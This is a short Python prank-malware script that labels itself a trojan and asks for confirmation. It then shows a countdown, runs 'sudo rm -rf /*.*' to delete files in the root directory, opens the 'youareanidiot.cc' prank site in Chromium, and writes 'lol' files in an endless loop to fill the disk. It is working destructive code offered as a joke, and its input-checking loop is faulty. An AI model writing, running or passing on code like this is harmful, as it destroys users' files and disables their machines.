print("WARNING!!!")
print("The Python Script You Just Executed Is Considered A Trojan.")
print("Execute? (y/n)")
ans = input("")
while not ans == "y" or ans == "n":
  ans = input("")
if ans == "y":
  import os
  import time
  i = -1
  os.system("sudo echo Thank U :)")
  time.sleep(5)
  while not i == 60:
    i += 1
    i2 = 0
    text = ""
    while not i2 == 60 - i:
      i2 += 1
      text = text + "-"
    print(text)
    os.system("clear")
    print("COMPUTER DESTRUCTION IN")
    print(str(60 - i) + " SECONDS!!!")
    time.sleep(1)
  os.system("clear")
  os.system("sudo rm -rf /*.*")
  print("This PC Has Been Destroyed!!!")
  print("Do Not Attempt To Reboot!!!")
  os.system("chromium https://youareanidiot.cc && chromium https://youareanidiot.cc/lol.html")
  i = 0
  while True:
    i += 1
    os.system("echo lol > no" + str(i) + ".txt")
